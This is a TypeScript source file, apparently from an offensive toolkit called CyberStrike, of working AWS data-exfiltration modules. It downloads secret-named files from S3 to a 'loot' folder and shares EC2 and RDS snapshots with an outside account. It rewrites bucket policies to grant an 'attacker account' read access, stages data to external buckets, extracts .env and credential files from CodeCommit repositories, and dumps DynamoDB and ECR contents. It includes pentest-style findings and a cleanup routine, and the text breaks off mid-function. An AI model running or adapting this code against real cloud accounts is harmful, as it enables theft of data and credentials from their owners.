import { aws, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function s3Dump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const bucket = argVal(args, "--bucket")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")
  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup|id_rsa"
  let regex: RegExp
  try {
    regex = new RegExp(sensitivePattern, "i")
  } catch {
    return { output: `[-] Invalid regex pattern: ${sensitivePattern}`, findings: [] }
  }

  if (bucket) {
    const r = await aws(["s3", "ls", `s3://${bucket}`, "--recursive"], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`, findings: [] }
    const files = r.stdout.split("\n").filter((f) => regex.test(f))
    const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files: ${files.length}`]
    for (const f of files) output.push(`    ${f.trim()}`)
    if (download && files.length > 0) {
      for (const f of files.slice(0, 10)) {
        const key = f.trim().split(/\s+/).pop() || ""
        const dl = await aws(["s3", "cp", `s3://${bucket}/${key}`, "./s3_loot/"], profile, region, timeout)
        output.push(dl.exitCode === 0 ? `    Downloaded: ${key}` : `    Failed: ${key}`)
      }
    }
    return { output: output.join("\n"), findings: [] }
  }

  const r = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
  if (r.exitCode !== 0) return { output: `[-] Cannot list buckets: ${r.stderr.trim()}`, findings: [] }
  const buckets = tryJson(r.stdout) || []
  const output = [`[*] Found ${buckets.length} bucket(s)\n`]

  for (const b of buckets) {
    const lr = await aws(["s3", "ls", `s3://${b}`, "--recursive"], profile, region, timeout)
    if (lr.exitCode !== 0) {
      output.push(`[-] ${b}: access denied`)
      continue
    }
    const files = lr.stdout.split("\n").filter((f) => regex.test(f))
    output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
    for (const f of files.slice(0, 5)) output.push(`    ${f.trim()}`)
  }

  return { output: output.join("\n"), findings: [] }
}

export async function ec2Snapshot(args: string[], timeout: number): Promise<HookResult> {
  const volumeId = argVal(args, "--volume-id")
  const shareAccount = argVal(args, "--share-account")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!volumeId) return { output: "ERROR: --volume-id required", findings: [] }

  const r = await aws(
    [
      "ec2",
      "create-snapshot",
      "--volume-id",
      volumeId,
      "--description",
      "CyberStrike forensic snapshot",
      "--tag-specifications",
      "ResourceType=snapshot,Tags=[{Key=CreatedBy,Value=CyberStrike}]",
    ],
    profile,
    region,
    timeout,
  )
  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings: [] }
  const snap = tryJson(r.stdout)
  const output = [`[+] Snapshot created: ${snap?.SnapshotId}`, `    Volume: ${volumeId}`, `    State: ${snap?.State}`]

  if (shareAccount) {
    const sr = await aws(
      [
        "ec2",
        "modify-snapshot-attribute",
        "--snapshot-id",
        snap?.SnapshotId,
        "--attribute",
        "createVolumePermission",
        "--operation-type",
        "add",
        "--user-ids",
        shareAccount,
      ],
      profile,
      region,
      timeout,
    )
    output.push(
      sr.exitCode === 0 ? `[+] Shared with account: ${shareAccount}` : `[-] Sharing failed: ${sr.stderr.trim()}`,
    )
  }

  return { output: output.join("\n"), findings: [] }
}

export async function rdsDump(args: string[], timeout: number): Promise<HookResult> {
  const dbId = argVal(args, "--db-identifier")
  const shareAccount = argVal(args, "--share-account")
  const restore = hasFlag(args, "--restore")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []

  if (!dbId) {
    const r = await aws(
      [
        "rds",
        "describe-db-instances",
        "--query",
        "DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus,Endpoint.Address]",
      ],
      profile,
      region,
      timeout,
    )
    if (r.exitCode !== 0) return { output: `[-] Cannot list RDS instances: ${r.stderr.trim()}`, findings }
    const dbs = tryJson(r.stdout) || []
    const output = [`[*] RDS Instances: ${dbs.length}\n`]
    for (const db of dbs) output.push(`    ${db[0]} (${db[1]}) — ${db[2]} — ${db[3] || "no endpoint"}`)
    output.push("\n[*] Use --db-identifier to create a snapshot")
    return { output: output.join("\n"), findings }
  }

  const output = [`[*] RDS Snapshot — target: ${dbId}\n`]
  const snapId = `cs-snap-${Date.now()}`
  const r = await aws(
    [
      "rds",
      "create-db-snapshot",
      "--db-instance-identifier",
      dbId,
      "--db-snapshot-identifier",
      snapId,
      "--tags",
      "Key=CreatedBy,Value=CyberStrike",
    ],
    profile,
    region,
    timeout,
  )
  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings }

  output.push(`[+] Snapshot created: ${snapId}`)
  output.push(`[*] Waiting for snapshot to become available...`)

  const wait = await aws(
    ["rds", "wait", "db-snapshot-available", "--db-snapshot-identifier", snapId],
    profile,
    region,
    timeout,
  )
  if (wait.exitCode === 0) output.push(`[+] Snapshot available`)

  findings.push({
    checkId: "AWS-RDS-001",
    provider: "aws",
    severity: "critical",
    status: "EXTRACTED",
    resource: `rds:${dbId}`,
    title: `RDS snapshot created: ${snapId}`,
    details: `Snapshot of ${dbId} created for data extraction`,
    remediation: "Delete snapshot after engagement: aws rds delete-db-snapshot",
  })

  if (shareAccount) {
    const sr = await aws(
      [
        "rds",
        "modify-db-snapshot-attribute",
        "--db-snapshot-identifier",
        snapId,
        "--attribute-name",
        "restore",
        "--values-to-add",
        shareAccount,
      ],
      profile,
      region,
      timeout,
    )
    if (sr.exitCode === 0) {
      output.push(`[+] Snapshot shared with account: ${shareAccount}`)
      findings.push({
        checkId: "AWS-RDS-002",
        provider: "aws",
        severity: "critical",
        status: "SHARED",
        resource: `rds:${snapId}`,
        title: `RDS snapshot shared cross-account: ${shareAccount}`,
        details: `Snapshot ${snapId} shared with AWS account ${shareAccount}`,
        remediation: "Revoke sharing after extraction",
      })
    } else {
      output.push(`[-] Sharing failed: ${sr.stderr.trim()}`)
    }
  }

  if (restore) {
    const restoreId = `cs-restore-${Date.now()}`
    const rr = await aws(
      [
        "rds",
        "restore-db-instance-from-db-snapshot",
        "--db-instance-identifier",
        restoreId,
        "--db-snapshot-identifier",
        snapId,
        "--db-instance-class",
        "db.t3.micro",
        "--tags",
        "Key=CreatedBy,Value=CyberStrike",
      ],
      profile,
      region,
      timeout,
    )
    if (rr.exitCode === 0) {
      output.push(`[+] Restoring snapshot to instance: ${restoreId}`)
      output.push(`[*] Wait for instance, then connect and extract data`)
    } else {
      output.push(`[-] Restore failed: ${rr.stderr.trim()}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function dynamodbDump(args: string[], timeout: number): Promise<HookResult> {
  const tableName = argVal(args, "--table-name")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const limit = argVal(args, "--limit") || "100"
  const output: string[] = ["[*] DynamoDB Data Extraction\n"]
  const findings: Finding[] = []

  if (!tableName) {
    const tables = await aws(["dynamodb", "list-tables", "--query", "TableNames"], profile, region, timeout)
    if (tables.exitCode !== 0) return { output: `[-] Cannot list tables: ${tables.stderr.trim()}`, findings }
    const tl = tryJson(tables.stdout) || []
    output.push(`[+] DynamoDB Tables: ${tl.length}\n`)

    for (const t of tl) {
      const desc = await aws(
        [
          "dynamodb",
          "describe-table",
          "--table-name",
          t,
          "--query",
          "Table.[TableName,ItemCount,TableSizeBytes,TableStatus,SSEDescription.Status]",
        ],
        profile,
        region,
        timeout,
      )
      if (desc.exitCode === 0) {
        const d = tryJson(desc.stdout)
        const sizeKb = Math.round((d?.[2] || 0) / 1024)
        output.push(
          `    ${d?.[0]} — ${d?.[1]} items — ${sizeKb}KB — ${d?.[3]}${d?.[4] === "ENABLED" ? "" : " [NO SSE]"}`,
        )
      }
    }
    output.push("\n[*] Use --table-name TABLE to scan/dump data")
    return { output: output.join("\n"), findings }
  }

  output.push(`[*] Scanning table: ${tableName} (limit: ${limit})\n`)

  const scan = await aws(
    ["dynamodb", "scan", "--table-name", tableName, "--max-items", limit, "--output", "json"],
    profile,
    region,
    timeout,
  )
  if (scan.exitCode !== 0) {
    output.push(`[-] Scan failed: ${scan.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const result = tryJson(scan.stdout)
  const items = result?.Items || []
  const count = result?.Count || 0
  const scannedCount = result?.ScannedCount || 0

  output.push(`[+] Items returned: ${count} (scanned: ${scannedCount})`)

  for (const item of items.slice(0, 20)) {
    const flat = Object.entries(item)
      .map(([k, v]) => {
        const val = v as Record<string, string>
        return `${k}=${val.S || val.N || val.BOOL || "[complex]"}`
      })
      .join(", ")
    output.push(`    ${flat.slice(0, 120)}${flat.length > 120 ? "..." : ""}`)
  }

  if (count > 20) output.push(`    ... and ${count - 20} more items`)

  const secrets = JSON.stringify(items).match(/(password|secret|key|token|api_key|private_key)/gi) || []
  if (secrets.length > 0) {
    output.push(`\n    [!] Potential secrets found: ${[...new Set(secrets)].join(", ")}`)
    findings.push({
      checkId: "AWS-EXFIL-001",
      provider: "aws",
      severity: "critical",
      status: "EXTRACTED",
      resource: `dynamodb:${tableName}`,
      title: `DynamoDB data with secrets: ${tableName}`,
      details: `${count} items extracted, potential secrets: ${[...new Set(secrets)].join(",")}`,
      remediation: "Review table data for sensitive information, enable SSE",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function ebsDirectRead(args: string[], timeout: number): Promise<HookResult> {
  const snapshotId = argVal(args, "--snapshot-id")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] EBS Direct API Snapshot Read\n"]
  const findings: Finding[] = []

  if (!snapshotId) {
    const snaps = await aws(
      [
        "ec2",
        "describe-snapshots",
        "--owner-ids",
        "self",
        "--query",
        "Snapshots[].[SnapshotId,VolumeId,VolumeSize,State,Description]",
        "--max-items",
        "50",
      ],
      profile,
      region,
      timeout,
    )
    if (snaps.exitCode === 0) {
      const sl = tryJson(snaps.stdout) || []
      output.push(`[+] Available Snapshots: ${sl.length}`)
      for (const s of sl) output.push(`    ${s[0]} — vol: ${s[1]} — ${s[2]}GB — ${s[3]} — ${s[4] || ""}`)
    }
    output.push("\n[*] Use --snapshot-id to read snapshot blocks via EBS Direct API")
    output.push("[*] EBS Direct API reads block-level data without mounting (no EC2 needed)")
    return { output: output.join("\n"), findings }
  }

  const blocks = await aws(
    ["ebs", "list-snapshot-blocks", "--snapshot-id", snapshotId, "--max-results", "100"],
    profile,
    region,
    timeout,
  )
  if (blocks.exitCode !== 0) {
    output.push(`[-] Cannot list blocks: ${blocks.stderr.trim()}`)
    output.push("[*] EBS Direct API may require specific permissions: ebs:ListSnapshotBlocks, ebs:GetSnapshotBlock")
    return { output: output.join("\n"), findings }
  }

  const result = tryJson(blocks.stdout)
  const blockList = result?.Blocks || []
  const volumeSize = result?.VolumeSize
  const blockSize = result?.BlockSize

  output.push(`[+] Snapshot: ${snapshotId}`)
  output.push(`    Volume size: ${volumeSize}GB, Block size: ${blockSize} bytes`)
  output.push(`    Blocks (first 100): ${blockList.length}`)

  findings.push({
    checkId: "AWS-EXFIL-002",
    provider: "aws",
    severity: "high",
    status: "ACCESSED",
    resource: `ebs:${snapshotId}`,
    title: `EBS snapshot blocks listed: ${snapshotId}`,
    details: `${blockList.length} blocks accessible, ${volumeSize}GB volume`,
    remediation: "Review ebs:ListSnapshotBlocks and ebs:GetSnapshotBlock permissions",
  })

  output.push(
    `\n[*] To read block data: aws ebs get-snapshot-block --snapshot-id ${snapshotId} --block-index <INDEX> --block-token <TOKEN>`,
  )
  output.push("[*] Block data can be reassembled into a raw disk image for offline analysis")

  return { output: output.join("\n"), findings }
}

export async function s3Exfil(args: string[], timeout: number): Promise<HookResult> {
  const bucket = argVal(args, "--bucket")
  const externalAccount = argVal(args, "--external-account")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] S3 Bucket Policy Exfiltration\n"]
  const findings: Finding[] = []

  if (!bucket) return { output: "ERROR: --bucket required", findings }
  if (!externalAccount) return { output: "ERROR: --external-account required (attacker account ID)", findings }

  const existing = await aws(["s3api", "get-bucket-policy", "--bucket", bucket], profile, region, timeout)
  let doc: Record<string, unknown> = { Version: "2012-10-17", Statement: [] }
  if (existing.exitCode === 0) {
    doc = tryJson(tryJson(existing.stdout)?.Policy || "{}") || doc
  }

  output.push(`[*] Current policy: ${(doc.Statement as unknown[])?.length || 0} statement(s)`)

  const newStatement = {
    Sid: "CyberStrikeExfil",
    Effect: "Allow",
    Principal: { AWS: `arn:aws:iam::${externalAccount}:root` },
    Action: ["s3:GetObject", "s3:ListBucket"],
    Resource: [`arn:aws:s3:::${bucket}`, `arn:aws:s3:::${bucket}/*`],
  }

  ;(doc.Statement as unknown[]).push(newStatement)

  const put = await aws(
    ["s3api", "put-bucket-policy", "--bucket", bucket, "--policy", JSON.stringify(doc)],
    profile,
    region,
    timeout,
  )

  if (put.exitCode === 0) {
    output.push(`\n[+] Bucket policy modified — external account ${externalAccount} granted read access`)
    output.push(`\n[*] From attacker account:`)
    output.push(`    aws s3 ls s3://${bucket} --recursive`)
    output.push(`    aws s3 sync s3://${bucket} ./loot/`)
    findings.push({
      checkId: "AWS-EXFIL-003",
      provider: "aws",
      severity: "critical",
      status: "MODIFIED",
      resource: `s3:${bucket}`,
      title: `S3 bucket policy modified for exfil: ${bucket}`,
      details: `External account ${externalAccount} granted s3:GetObject and s3:ListBucket`,
      remediation: "Remove CyberStrikeExfil statement from bucket policy",
    })
  } else {
    output.push(`[-] Policy modification failed: ${put.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function dataStage(args: string[], timeout: number): Promise<HookResult> {
  const sourcePath = argVal(args, "--source")
  const destBucket = argVal(args, "--dest-bucket")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const compress = !hasFlag(args, "--no-compress")
  const output: string[] = ["[*] Data Staging\n"]
  const findings: Finding[] = []

  if (!sourcePath) return { output: "ERROR: --source required (local path or s3://)", findings }
  if (!destBucket) return { output: "ERROR: --dest-bucket required (staging bucket)", findings }

  if (sourcePath.startsWith("s3://")) {
    output.push(`[*] Source: ${sourcePath} (S3)`)
    output.push(`[*] Destination: s3://${destBucket}/staged/`)

    const r = await aws(["s3", "sync", sourcePath, `s3://${destBucket}/staged/`, "--quiet"], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`[+] Data staged to s3://${destBucket}/staged/`)
    } else {
      output.push(`[-] Staging failed: ${r.stderr.trim()}`)
    }
  } else {
    output.push(`[*] Source: ${sourcePath} (local)`)

    if (compress) {
      const archiveName = `staged-${Date.now()}.tar.gz`
      output.push(`[*] Compressing to ${archiveName}...`)

      const { run } = await import("./shared")
      const tar = await run("tar", ["-czf", archiveName, sourcePath], timeout)
      if (tar.exitCode !== 0) {
        output.push(`[-] Compression failed: ${tar.stderr.trim()}`)
        return { output: output.join("\n"), findings }
      }

      const upload = await aws(
        ["s3", "cp", archiveName, `s3://${destBucket}/staged/${archiveName}`],
        profile,
        region,
        timeout,
      )
      if (upload.exitCode === 0) {
        output.push(`[+] Staged: s3://${destBucket}/staged/${archiveName}`)
      } else {
        output.push(`[-] Upload failed: ${upload.stderr.trim()}`)
      }
    } else {
      const upload = await aws(
        ["s3", "sync", sourcePath, `s3://${destBucket}/staged/`, "--quiet"],
        profile,
        region,
        timeout,
      )
      if (upload.exitCode === 0) {
        output.push(`[+] Data staged to s3://${destBucket}/staged/`)
      } else {
        output.push(`[-] Staging failed: ${upload.stderr.trim()}`)
      }
    }
  }

  findings.push({
    checkId: "AWS-EXFIL-004",
    provider: "aws",
    severity: "critical",
    status: "STAGED",
    resource: `s3:${destBucket}`,
    title: `Data staged to: ${destBucket}`,
    details: `Data from ${sourcePath} staged to s3://${destBucket}/staged/`,
    remediation: "Delete staged data and review bucket access logs",
  })

  return { output: output.join("\n"), findings }
}

export async function cleanupAws(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const dryRun = hasFlag(args, "--dry-run")
  const mode = dryRun ? "DRY RUN" : "LIVE"
  const output = [`[*] CyberStrike AWS cleanup — ${mode}\n`]

  const snaps = await aws(
    [
      "ec2",
      "describe-snapshots",
      "--owner-ids",
      "self",
      "--filters",
      "Name=tag:CreatedBy,Values=CyberStrike",
      "--query",
      "Snapshots[].SnapshotId",
    ],
    profile,
    region,
    timeout,
  )
  if (snaps.exitCode === 0) {
    const snapList = tryJson(snaps.stdout) || []
    output.push(`[+] Snapshots to clean: ${snapList.length}`)
    for (const s of snapList) {
      if (dryRun) {
        output.push(`    Would delete: ${s}`)
      } else {
        await aws(["ec2", "delete-snapshot", "--snapshot-id", s], profile, region, timeout)
        output.push(`    Deleted: ${s}`)
      }
    }
  }

  const rdsSnaps = await aws(
    [
      "rds",
      "describe-db-snapshots",
      "--query",
      "DBSnapshots[?contains(DBSnapshotIdentifier,'cs-snap-')].[DBSnapshotIdentifier]",
    ],
    profile,
    region,
    timeout,
  )
  if (rdsSnaps.exitCode === 0) {
    const rdsList = tryJson(rdsSnaps.stdout) || []
    output.push(`[+] RDS snapshots to clean: ${rdsList.length}`)
    for (const s of rdsList) {
      const snapId = s[0]
      if (dryRun) {
        output.push(`    Would delete: ${snapId}`)
      } else {
        await aws(["rds", "delete-db-snapshot", "--db-snapshot-identifier", snapId], profile, region, timeout)
        output.push(`    Deleted: ${snapId}`)
      }
    }
  }

  const lambdas = await aws(
    ["lambda", "list-functions", "--query", "Functions[?contains(FunctionName,'cs-')].[FunctionName]"],
    profile,
    region,
    timeout,
  )
  if (lambdas.exitCode === 0) {
    const ll = tryJson(lambdas.stdout) || []
    output.push(`[+] Lambda functions to clean: ${ll.length}`)
    for (const l of ll) {
      if (dryRun) {
        output.push(`    Would delete: ${l[0]}`)
      } else {
        await aws(["lambda", "delete-function", "--function-name", l[0]], profile, region, timeout)
        output.push(`    Deleted: ${l[0]}`)
      }
    }
  }

  const users = await aws(
    ["iam", "list-users", "--query", "Users[?contains(UserName,'cs-')].[UserName]"],
    profile,
    region,
    timeout,
  )
  if (users.exitCode === 0) {
    const ul = tryJson(users.stdout) || []
    output.push(`[+] IAM users to clean: ${ul.length}`)
    for (const u of ul) {
      if (dryRun) {
        output.push(`    Would delete: ${u[0]}`)
      } else {
        const keys = await aws(
          ["iam", "list-access-keys", "--user-name", u[0], "--query", "AccessKeyMetadata[].AccessKeyId"],
          profile,
          region,
          timeout,
        )
        for (const k of tryJson(keys.stdout) || []) {
          await aws(["iam", "delete-access-key", "--user-name", u[0], "--access-key-id", k], profile, region, timeout)
        }
        await aws(["iam", "delete-login-profile", "--user-name", u[0]], profile, region, timeout)
        const policies = await aws(
          ["iam", "list-attached-user-policies", "--user-name", u[0], "--query", "AttachedPolicies[].PolicyArn"],
          profile,
          region,
          timeout,
        )
        for (const p of tryJson(policies.stdout) || []) {
          await aws(["iam", "detach-user-policy", "--user-name", u[0], "--policy-arn", p], profile, region, timeout)
        }
        await aws(["iam", "delete-user", "--user-name", u[0]], profile, region, timeout)
        output.push(`    Deleted: ${u[0]}`)
      }
    }
  }

  const roles = await aws(
    ["iam", "list-roles", "--query", "Roles[?contains(RoleName,'cs-')].[RoleName]"],
    profile,
    region,
    timeout,
  )
  if (roles.exitCode === 0) {
    const rl = tryJson(roles.stdout) || []
    output.push(`[+] IAM roles to clean: ${rl.length}`)
    for (const r of rl) {
      if (dryRun) {
        output.push(`    Would delete: ${r[0]}`)
      } else {
        const policies = await aws(
          ["iam", "list-attached-role-policies", "--role-name", r[0], "--query", "AttachedPolicies[].PolicyArn"],
          profile,
          region,
          timeout,
        )
        for (const p of tryJson(policies.stdout) || []) {
          await aws(["iam", "detach-role-policy", "--role-name", r[0], "--policy-arn", p], profile, region, timeout)
        }
        await aws(["iam", "delete-role", "--role-name", r[0]], profile, region, timeout)
        output.push(`    Deleted: ${r[0]}`)
      }
    }
  }

  const cfnStacks = await aws(
    [
      "cloudformation",
      "list-stacks",
      "--stack-status-filter",
      "CREATE_COMPLETE",
      "UPDATE_COMPLETE",
      "--query",
      "StackSummaries[?contains(StackName,'cs-')].[StackName]",
    ],
    profile,
    region,
    timeout,
  )
  if (cfnStacks.exitCode === 0) {
    const sl = tryJson(cfnStacks.stdout) || []
    output.push(`[+] CloudFormation stacks to clean: ${sl.length}`)
    for (const s of sl) {
      if (dryRun) {
        output.push(`    Would delete: ${s[0]}`)
      } else {
        await aws(["cloudformation", "delete-stack", "--stack-name", s[0]], profile, region, timeout)
        output.push(`    Deleting: ${s[0]}`)
      }
    }
  }

  const events = await aws(
    ["events", "list-rules", "--query", "Rules[?contains(Name,'cs-')].[Name]"],
    profile,
    region,
    timeout,
  )
  if (events.exitCode === 0) {
    const el = tryJson(events.stdout) || []
    output.push(`[+] EventBridge rules to clean: ${el.length}`)
    for (const e of el) {
      if (dryRun) {
        output.push(`    Would delete: ${e[0]}`)
      } else {
        const targets = await aws(
          ["events", "list-targets-by-rule", "--rule", e[0], "--query", "Targets[].Id"],
          profile,
          region,
          timeout,
        )
        const tl = tryJson(targets.stdout) || []
        if (tl.length > 0) {
          await aws(["events", "remove-targets", "--rule", e[0], "--ids", ...tl], profile, region, timeout)
        }
        await aws(["events", "delete-rule", "--name", e[0]], profile, region, timeout)
        output.push(`    Deleted: ${e[0]}`)
      }
    }
  }

  const trails = await aws(["cloudtrail", "describe-trails", "--query", "trailList[].[Name]"], profile, region, timeout)
  if (trails.exitCode === 0) {
    for (const t of tryJson(trails.stdout) || []) {
      const status = await aws(["cloudtrail", "get-trail-status", "--name", t[0]], profile, region, timeout)
      const s = tryJson(status.stdout)
      if (!s?.IsLogging) {
        if (dryRun) {
          output.push(`    Would restart logging: ${t[0]}`)
        } else {
          await aws(["cloudtrail", "start-logging", "--name", t[0]], profile, region, timeout)
          output.push(`[+] Restarted logging: ${t[0]}`)
        }
      }
    }
  }

  output.push(`\n[*] Cleanup ${mode} complete`)
  return { output: output.join("\n"), findings: [] }
}

export async function codecommitDump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const repoName = argVal(args, "--repo")
  const branch = argVal(args, "--branch")
  const findings: Finding[] = []
  const output: string[] = ["[*] CodeCommit Repository Dump\n"]

  const repos = await aws(
    ["codecommit", "list-repositories", "--query", "repositories[].[repositoryName,repositoryId]"],
    profile,
    region,
    timeout,
  )
  if (repos.exitCode !== 0)
    return { output: output.join("\n") + "\n[-] Access denied: codecommit:ListRepositories", findings }

  const rl = tryJson(repos.stdout) || []
  output.push(`[+] Repositories: ${rl.length}`)

  const targets = repoName ? rl.filter((r: string[]) => r[0] === repoName) : rl

  for (const r of targets) {
    const name = r[0]
    output.push(`\n  Repository: ${name}`)

    const meta = await aws(
      [
        "codecommit",
        "get-repository",
        "--repository-name",
        name,
        "--query",
        "repositoryMetadata.{defaultBranch:defaultBranch,cloneUrl:cloneUrlHttp,lastModified:lastModifiedDate,description:repositoryDescription}",
      ],
      profile,
      region,
      timeout,
    )
    if (meta.exitCode === 0) {
      const m = tryJson(meta.stdout)
      if (m) {
        output.push(`    Default branch: ${m.defaultBranch || "N/A"}`)
        output.push(`    Clone URL: ${m.cloneUrl}`)
        output.push(`    Last modified: ${m.lastModified}`)
        if (m.description) output.push(`    Description: ${m.description}`)
      }
    }

    const branches = await aws(
      ["codecommit", "list-branches", "--repository-name", name, "--query", "branches"],
      profile,
      region,
      timeout,
    )
    if (branches.exitCode === 0) {
      const bl = tryJson(branches.stdout) || []
      output.push(`    Branches: ${bl.join(", ")}`)
    }

    const targetBranch =
      branch ||
      tryJson(
        (
          await aws(
            ["codecommit", "get-repository", "--repository-name", name, "--query", "repositoryMetadata.defaultBranch"],
            profile,
            region,
            timeout,
          )
        ).stdout,
      )
    if (targetBranch) {
      const folderContent = await aws(
        [
          "codecommit",
          "get-folder",
          "--repository-name",
          name,
          "--folder-path",
          "/",
          "--query",
          "{files:files[].relativePath,subFolders:subFolders[].relativePath}",
        ],
        profile,
        region,
        timeout,
      )
      if (folderContent.exitCode === 0) {
        const fc = tryJson(folderContent.stdout)
        if (fc) {
          output.push(`    Root files: ${(fc.files || []).join(", ")}`)
          output.push(`    Directories: ${(fc.subFolders || []).join(", ")}`)

          const secretFiles = [
            ".env",
            ".env.production",
            "config.json",
            "secrets.json",
            "credentials",
            ".aws/credentials",
            "docker-compose.yml",
            "terraform.tfvars",
            "*.pem",
            "*.key",
          ]
          const foundSecrets = (fc.files || []).filter((f: string) =>
            secretFiles.some((s) => f.toLowerCase().includes(s.replace("*.", ".")) || f.toLowerCase() === s),
          )
          if (foundSecrets.length) {
            output.push(`    [!] Potential secret files: ${foundSecrets.join(", ")}`)
            for (const sf of foundSecrets) {
              const content = await aws(
                ["codecommit", "get-file", "--repository-name", name, "--file-path", sf, "--query", "fileContent"],
                profile,
                region,
                timeout,
              )
              if (content.exitCode === 0) {
                const decoded = Buffer.from(tryJson(content.stdout) || "", "base64").toString()
                output.push(`\n    --- ${sf} ---`)
                output.push(`    ${decoded.slice(0, 500)}`)
                if (decoded.length > 500) output.push(`    ... (${decoded.length} bytes total)`)
                findings.push({
                  checkId: "AWS-EXFIL-005",
                  provider: "aws",
                  severity: "critical",
                  status: "EXTRACTED",
                  resource: `codecommit:${name}:${sf}`,
                  title: `Secret file extracted from repo: ${name}/${sf}`,
                  details: `File content: ${decoded.slice(0, 80)}...`,
                  remediation: "Rotate all credentials in file, remove from repository, add to .gitignore",
                })
              }
            }
          }
        }
      }

      output.push(
        `\n    [*] Clone command: git clone ${tryJson((await aws(["codecommit", "get-repository", "--repository-name", name, "--query", "repositoryMetadata.cloneUrlHttp"], profile, region, timeout)).stdout) || name}`,
      )

      findings.push({
        checkId: "AWS-EXFIL-006",
        provider: "aws",
        severity: "high",
        status: "ACCESSIBLE",
        resource: `codecommit:${name}`,
        title: `CodeCommit repository accessible: ${name}`,
        details: "Repository can be cloned — source code may contain hardcoded secrets, business logic, internal APIs",
        remediation: "Restrict codecommit:GitPull and codecommit:GetFile permissions",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function ecrDump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const repoName = argVal(args, "--repository")
  const pullImage = hasFlag(args, "--pull")
  const findings: Finding[] = []
  const output: string[] = ["[*] ECR Container Image Dump\n"]

  const repos = await aws(
    [
      "ecr",
      "describe-repositories",
      "--query",
      "repositories[].[repositoryName,repositoryUri,repositoryArn,imageScanningConfiguration.scanOnPush,imageTagMutability]",
    ],
    profile,
    region,
    timeout,
  )
  if (repos.exitCode !== 0)
    return { output: output.join("\n") + "\n[-] Access denied: ecr:DescribeRepositories", findings }

  const rl = tryJson(repos.stdout) || []
  output.push(`[+] ECR Repositories: ${rl.length}`)

  const targets = repoName ? rl.filter((r: string[]) => r[0] === repoName) : rl

  for (const r of targets) {
    const name = r[0]
    output.push(`\n  Repository: ${name}`)
    output.push(`    URI: ${r[1]}`)
    output.push(`    Scan on push: ${r[3]}  Tag mutability: ${r[4]}`)

    const policy = await aws(
      ["ecr", "get-repository-policy", "--repository-name", name, "--query", "policyText"],
      profile,
      region,
      timeout,
    )
    if (policy.exitCode === 0) {
      const p = tryJson(policy.stdout)
      const pStr = typeof p === "string" ? p : JSON.stringify(p)
      if (pStr.includes('"*"') || pStr.includes('"AWS":"*"')) {
        output.push(`    [!] Repository policy allows public access`)
        findings.push({
          checkId: "AWS-EXFIL-007",
          provider: "aws",
          severity: "high",
          status: "OPEN",
          resource: `ecr:${name}`,
          title: `ECR repo with public access policy: ${name}`,
          details: "Repository policy allows cross-account or public image pull",
          remediation: "Restrict ECR repository policy",
        })
      }
    }

    const images = await aws(
      [
        "ecr",
        "describe-images",
        "--repository-name",
        name,
        "--query",
        "imageDetails | sort_by(@, &imagePushedAt) | reverse(@) | [0:10].[{tags:imageTags,digest:imageDigest,size:imageSizeInBytes,pushed:imagePushedAt,vulns:imageScanFindingsSummary.findingSeverityCounts}]",
      ],
      profile,
      region,
      timeout,
    )
    if (images.exitCode === 0) {
      const il = tryJson(images.stdout) || []
      output.push(`    Images (latest 10):`)
      for (const img of il) {
        const i = img[0] || img
        const sizeMB = Math.round((i.size || 0) / 1024 / 1024)
        const tags = (i.tags || []).join(", ") || "untagged"
        output.push(`      ${tags}  Size: ${sizeMB}MB  Pushed: ${i.pushed}`)
        if (i.vulns) {
          output.push(
            `        Vulns: Critical=${i.vulns.CRITICAL || 0} High=${i.vulns.HIGH || 0} Medium=${i.vulns.MEDIUM || 0}`,
          )
        }
      }
    }

    const lifecycle = await aws(
      ["ecr", "get-lifecycle-policy", "--repository-name", name, "--query", "lifecyclePolicyText"],
      profile,
      region,
      timeout,
    )
    if (lifecycle.exitCode === 0) {
      output.push(`    Lifecycle policy: configured`)
    }

    findings.push({
      checkId: "AWS-EXFIL-008",
      provider: "aws",
      severity: "high",
      status: "ACCESSIBLE",
      resource: `ecr:${name}`,
      title: `ECR repository accessible: ${name}`,
      details: `URI: ${r[1]} — images may contain embedded secrets, API keys, service credentials in env vars or config files`,
      remediation: "Restrict ecr:GetAuthorizationToken and ecr:BatchGetImage permissions",
    })
  }

  if (pullImage && repoName) {
    const token = await aws(
      [
        "ecr",
        "get-authorization-token",
        "--query",
        "authorizationData[0].{token:authorizationToken,endpoint:proxyEndpoint}",
      ],
      profile,
      region,
      timeout,
    )
    if (token.exitCode === 0) {
      const t = tryJson(token.stdout)
      if (t) {
        const decoded = Buffer.from(t.token, "base64").toString()
        const parts = decoded.split(":")
